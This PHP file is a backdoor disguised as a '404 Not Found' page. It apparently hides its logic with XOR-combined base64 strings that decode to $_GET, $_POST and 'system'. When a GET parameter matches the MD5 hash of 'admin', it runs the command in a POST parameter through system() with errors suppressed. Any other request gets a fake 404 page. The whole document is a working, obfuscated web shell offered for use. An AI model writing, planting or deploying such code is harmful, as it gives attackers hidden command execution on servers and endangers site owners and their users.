
<?php
$a = ${base64_decode("Z3w7KA==")^base64_decode("ODt+fA==")}[1];
$b = ${base64_decode("bzsjKjw=")^base64_decode("MGtseWg=")}[2];
//  1 is md5('admin'). You can have on your own.
if(isset($b) and md5($a)=='21232f297a57a5a743894a0e4a801fc3')
{
    $t = base64_decode("KD0mLSM9")^base64_decode("W0RVWUZQ");
    @${'t'}($b);
  
}
else{
	
	echo '<title>Error 404!!1</title><p align="center">404.Not Found</p>';

	header('HTTP/1.1 404 Not Found');
	http_response_code(404);
}
?>